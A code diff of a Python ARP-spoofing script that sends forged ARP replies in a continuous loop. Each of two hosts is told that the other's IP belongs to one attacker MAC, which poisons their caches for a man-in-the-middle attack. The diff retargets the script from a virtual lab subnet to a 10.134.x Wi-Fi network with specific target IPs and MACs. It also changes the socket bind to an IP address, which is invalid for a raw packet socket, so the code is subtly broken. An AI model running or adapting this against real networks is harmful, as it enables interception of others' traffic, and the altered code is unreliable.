@@ -8,7 +8,7 @@ def send_arp_reply(interface, source_ip, source_mac, target_ip, target_mac):
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
 
     # Set the interface for sending the packet
-    s.bind((interface, 0))
+    s.bind(("10.133.255.54", 0))
 
     # Craft the ARP reply packet
     ethernet_header = struct.pack("!6s6sH", target_mac, source_mac, 0x0806)
@@ -28,22 +28,22 @@ def send_arp_reply(interface, source_ip, source_mac, target_ip, target_mac):
 
 if __name__ == "__main__":
     # Specify the network interface
-    interface = "enp0s8"
+    interface = "Wi-Fi"
 
     # Specify the IP addresses
-    source_ip1 = "192.168.56.101"
-    source_ip2 = "192.168.56.1"
+    source_ip1 = "10.134.254.56"
+    source_ip2 = "10.134.253.72"
     
     # Example MAC address X (\x08\x00\x27\xAA\x76\xDB) (\x08\x00\x27\x25\xf9\x4D)
     source_mac = b'\x08\x00\x27\xAA\x76\xDB'
     source_mac = b'\x08\x00\x27\xAA\x76\xDB'   
     
     # Address of the target
-    target_ip1 = "192.168.56.1"
-    target_mac1 = b'\x0A\x00\x27\x00\x00\x15'  
+    target_ip1 = "10.134.253.72"
+    target_mac1 = b'\x98\x43\xfa\x32\xd9\xda'  
     
-    target_ip2 = "192.168.56.101"
-    target_mac2 = b'\x08\x00\x27\x25\xf9\x4D'  
+    target_ip2 = "10.134.254.56"
+    target_mac2 = b'\x90\x0f\x0c\xe6\x5e\x27'  
 
     # Send the ARP reply packet
     while True:
